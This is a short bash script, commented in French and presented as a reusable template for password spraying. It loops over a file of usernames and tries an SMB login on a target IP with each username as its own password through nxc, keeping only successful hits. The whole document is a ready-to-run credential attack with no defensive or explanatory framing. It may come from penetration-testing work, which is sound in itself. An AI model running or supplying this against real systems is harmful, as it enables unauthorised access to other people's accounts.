#!/bin/bash
# Template : Password Spraying (User == Pass) - Boucle Robuste
TARGET=$1
USER_FILE=$2

if [ -z "$USER_FILE" ]; then
    echo "[-] Usage: $0 <IP> <USER_FILE>"
    exit 1
fi

echo "[*] Test de la politique 'User == Pass' sur $TARGET..."

# On boucle sur chaque utilisateur et on teste son propre mot de passe
while read -r user; do
    # On évite de tester les comptes vides ou bizarres
    if [ ! -z "$user" ]; then
        # On lance nxc pour chaque utilisateur individuellement
        # --no-bruteforce est important ici
        nxc smb "$TARGET" -u "$user" -p "$user" --no-bruteforce | grep "+"
    fi
done < "$USER_FILE"
